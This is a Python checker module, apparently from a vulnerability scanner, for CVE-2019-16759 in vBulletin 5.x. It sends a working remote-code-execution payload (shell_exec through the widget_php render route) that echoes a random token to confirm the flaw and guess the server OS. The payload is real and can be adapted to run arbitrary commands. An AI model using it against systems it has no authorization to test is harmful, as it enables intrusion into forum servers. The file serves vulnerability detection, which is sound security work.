#!/usr/bin/python3

from app.lib.utils.request import request
from app.lib.utils.encode import urlencode, base64encode
from app.lib.utils.common import get_capta, get_useragent

class CVE_2019_16759_BaseVerify:
     def __init__(self, url):
          self.info = {
               'name': 'CVE-2019-16759',
               'description': 'vBulletin 5.x Front Code Execution Vulnerability, 受影响版本: vBulletin 5.x-5.5.4',
               'date': '2019-09-31',
               'exptype': 'check',
               'type': 'RCE'
          }
          self.url = url
          if not self.url.startswith("http") and not self.url.startswith("https"):
               self.url = "http://" + self.url
          self.osname = 'Unknown'
          self.capta = get_capta()
          self.headers = {
            'User-Agent': get_useragent()
          }

     def check(self):

          """
          检测是否存在漏洞

          :param:

          :return bool True or False: 是否存在漏洞
          """

          check_payload = {
               "routestring":"ajax/render/widget_php",
               "widgetConfig[code]": "echo shell_exec('%s'); exit;" % ('echo ' + self.capta + 'win^dowslin$1ux')
          }
          try:
               check_req = request.post(self.url, data = check_payload)
               if check_req.status_code == 200 and self.capta in check_req.text:
                    if 'windows' in check_req.text:
                         self.osname = 'Windows'
                    elif 'linux' in check_req.text:
                         self.osname = 'Linux'
                    return True
               else:
                    return False
          except Exception as e:
               print(e)
               return False
          finally:
               pass

if  __name__ == "__main__":
    CVE_2019_16759 = CVE_2019_16759_BaseVerify('http://127.0.0.1:32768')
